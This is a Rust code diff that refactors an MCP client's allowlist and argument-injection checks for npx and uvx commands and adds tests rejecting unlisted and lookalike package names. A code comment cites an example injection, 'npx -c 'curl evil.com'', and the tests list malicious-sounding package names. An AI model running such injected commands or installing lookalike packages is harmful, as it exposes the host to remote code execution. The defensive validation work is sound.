@@ -71,50 +71,15 @@ impl McpClient {
         }
 
         if cmd == "npx" || cmd == "uvx" {
-            // Must have a package argument starting with a safe prefix
-            // Search for first positional argument that isn't a flag
-            let pkg = args.iter().find(|a| !a.starts_with('-'));
-            if let Some(p) = pkg {
-                let allowed_prefixes = shared::mcp_constants::ALLOWED_MCP_PREFIXES;
-                if !allowed_prefixes.iter().any(|prefix| p.starts_with(prefix)) {
-                    return Err(anyhow!(
-                        "🚨 [SECURITY VIOLATION] Unapproved package '{}'. Must start with one of {:?}",
-                        p, allowed_prefixes
-                    ));
-                }
-            } else {
-                return Err(anyhow!(
-                    "🚨 [SECURITY VIOLATION] Missing package name for {}",
-                    cmd
-                ));
+            // (P-6) Package whitelist validation
+            if let Err(reason) = shared::mcp_constants::validate_mcp_package(cmd, &args) {
+                return Err(anyhow!("🚨 [SECURITY VIOLATION] {}", reason));
             }
 
             // [Gate: Arg Injection] Prevent CVE-2026-40933 (e.g., npx -c 'curl evil.com')
             // Only checked for npx/uvx — flags like -c/-e are legitimate for python3/node.
-            // Matches both separated (--eval code) and inline (--eval=code, -ecode) forms.
-            for arg in &args {
-                let lower = arg.to_lowercase();
-                for flag in shared::mcp_constants::FORBIDDEN_MCP_ARG_FLAGS {
-                    let matched = if flag.starts_with("--") {
-                        // Long flags: match exact or --flag=value
-                        lower == *flag
-                            || lower
-                                .strip_prefix(flag)
-                                .is_some_and(|rest| rest.starts_with('='))
-                    } else {
-                        // Short flags (-c, -e): match exact or -cVALUE
-                        // Guard: exclude long flags (--env-file must NOT match -e)
-                        !lower.starts_with("--")
-                            && (lower == *flag
-                                || (lower.starts_with(flag) && lower.len() > flag.len()))
-                    };
-                    if matched {
-                        return Err(anyhow!(
-                            "🚨 [SECURITY VIOLATION] Forbidden argument flag '{}' in MCP command (matched: {})",
-                            arg, flag
-                        ));
-                    }
-                }
+            if let Err(reason) = shared::mcp_constants::validate_mcp_arg_flags(&args) {
+                return Err(anyhow!("🚨 [SECURITY VIOLATION] {}", reason));
             }
         } else {
             // Binary commands (like fff-mcp, python3, node) skip prefix validation
@@ -554,7 +519,7 @@ mod tests {
             HashMap::new(),
         );
         let err2 = res2.err().unwrap().to_string();
-        assert!(err2.contains("Unapproved package"));
+        assert!(err2.contains("not whitelisted"));
 
         // [Gate: Arg injection CVE-2026-40933 — separated form]
         let res3 = McpClient::spawn(
@@ -669,14 +634,11 @@ mod tests {
             HashMap::new(),
         );
         if let Err(e) = res2 {
-            assert!(e.to_string().contains("Unapproved package"));
+            assert!(e.to_string().contains("not whitelisted"));
         } else {
             panic!("Expected Unapproved package error");
         }
 
-        // Red test: Try to spawn npx with approved package
-        // This should not fail validation but might fail actual OS spawn if package doesn't exist.
-        // We just check that error is NOT a SECURITY VIOLATION
         let res3 = McpClient::spawn(
             "test3".to_string(),
             "npx",
@@ -690,6 +652,21 @@ mod tests {
             assert!(
                 !e.to_string().contains("SECURITY VIOLATION"),
                 "Should pass security violation: {}",
+                e
+            );
+        }
+
+        // Red test: Try to spawn npx with allowed unscoped package
+        let res_unscoped = McpClient::spawn(
+            "test_unscoped".to_string(),
+            "npx",
+            vec!["-y".to_string(), "firecrawl-mcp".to_string()],
+            HashMap::new(),
+        );
+        if let Err(e) = res_unscoped {
+            assert!(
+                !e.to_string().contains("SECURITY VIOLATION"),
+                "Should pass security violation for unscoped package: {}",
                 e
             );
         }
@@ -780,5 +757,153 @@ mod tests {
 
         // Now it should be active
         assert_eq!(manager.active_client_ids().await.len(), 1);
+    }
+
+    /// [Verification Protocol — Step 1: Positive Test]
+    /// Every package in ALLOWED_MCP_PACKAGES must pass spawn validation.
+    #[tokio::test]
+    async fn test_all_allowed_packages_pass_validation() {
+        let packages = shared::mcp_constants::ALLOWED_MCP_PACKAGES;
+        for pkg in packages {
+            let res = McpClient::spawn(
+                format!("test_allowed_{}", pkg),
+                "npx",
+                vec!["-y".to_string(), pkg.to_string()],
+                HashMap::new(),
+            );
+            // May fail for OS reasons (npx not found), but MUST NOT fail with SECURITY VIOLATION
+            if let Err(e) = res {
+                assert!(
+                    !e.to_string().contains("SECURITY VIOLATION"),
+                    "ALLOWED_MCP_PACKAGES entry '{}' was rejected by security gate: {}",
+                    pkg,
+                    e
+                );
+            }
+        }
+    }
+
+    /// [Verification Protocol — Step 1: Positive Test]
+    /// Versioned packages (pkg@latest, pkg@1.2.3) must also pass.
+    #[tokio::test]
+    async fn test_versioned_allowed_packages_pass() {
+        let versioned_packages = vec![
+            "firecrawl-mcp@latest",
+            "firecrawl-mcp@3.14.1",
+            "exa-mcp-server@0.1.0",
+            "chrome-devtools-mcp@latest",
+            "freee-mcp@1.0.0",
+            "mcp-remote@latest",
+        ];
+        for pkg in versioned_packages {
+            let res = McpClient::spawn(
+                format!("test_versioned_{}", pkg),
+                "npx",
+                vec!["-y".to_string(), pkg.to_string()],
+                HashMap::new(),
+            );
+            if let Err(e) = res {
+                assert!(
+                    !e.to_string().contains("SECURITY VIOLATION"),
+                    "Versioned package '{}' should pass but was rejected: {}",
+                    pkg,
+                    e
+                );
+            }
+        }
+    }
+
+    /// [Verification Protocol — Step 2: Negative Test]
+    /// Unscoped packages NOT in ALLOWED_MCP_PACKAGES MUST be rejected.
+    #[tokio::test]
+    async fn test_unlisted_unscoped_packages_rejected() {
+        let evil_packages = vec![
+            "evil-mcp",
+            "crypto-miner-mcp",
+            "not-firecrawl-mcp",
+            "firecrawl", // partial match — must NOT pass
+            "mcp",       // substring — must NOT pass
+        ];
+        for pkg in evil_packages {
+            let res = McpClient::spawn(
+                format!("test_evil_{}", pkg),
+                "npx",
+                vec!["-y".to_string(), pkg.to_string()],
+                HashMap::new(),
+            );
+            assert!(
+                res.is_err(),
+                "Unlisted package '{}' should be rejected",
+                pkg
+            );
+            let err = res.err().unwrap().to_string(); // allow-anti-pattern
+            assert!(
+                err.contains("not whitelisted"),
+                "Unlisted package '{}' must produce 'not whitelisted' error, got: {}",
+                pkg,
+                err
+            );
+        }
+    }
+
+    /// [Verification Protocol — Step 2: Negative Test]
+    /// Suffix-attack packages (firecrawl-mcp-evil) must be rejected.
+    /// This verifies exact match + @version semantics prevent substring confusion.
+    #[tokio::test]
+    async fn test_suffix_attack_packages_rejected() {
+        let attack_packages = vec![
+            "firecrawl-mcp-evil",
+            "firecrawl-mcp-backdoor",
+            "exa-mcp-server-trojan",
+            "chrome-devtools-mcp-rce",
+        ];
+        for pkg in attack_packages {
+            let res = McpClient::spawn(
+                format!("test_suffix_attack_{}", pkg),
+                "npx",
+                vec!["-y".to_string(), pkg.to_string()],
+                HashMap::new(),
+            );
+            assert!(
+                res.is_err(),
+                "Suffix-attack package '{}' should be rejected",
+                pkg
+            );
+            let err = res.err().unwrap().to_string(); // allow-anti-pattern
+            assert!(
+                err.contains("not whitelisted"),
+                "Suffix-attack package '{}' must be caught with 'not whitelisted', got: {}",
+                pkg,
+                err
+            );
+        }
+    }
+
+    /// [Verification Protocol — Step 1: Positive Test]
+    /// New ALLOWED_MCP_PREFIXES must also pass.
+    #[tokio::test]
+    async fn test_new_prefix_packages_pass() {
+        let prefix_packages = vec![
+            "@brightdata/mcp",
+            "@upstash/context7-mcp@latest",
+            "@playwright/mcp@latest",
+            "@canva/cli@latest",
+        ];
+        for pkg in prefix_packages {
+            let res = McpClient::spawn(
+                format!("test_prefix_{}", pkg),
+                "npx",
+                vec!["-y".to_string(), pkg.to_string()],
+                HashMap::new(),
+            );
+            if let Err(e) = res {
+                assert!(
+                    !e.to_string().contains("SECURITY VIOLATION"),
+                    "Prefix-allowed package '{}' was rejected: {}",
+                    pkg,
+                    e
+                );
+            }
+        }
     }
 }
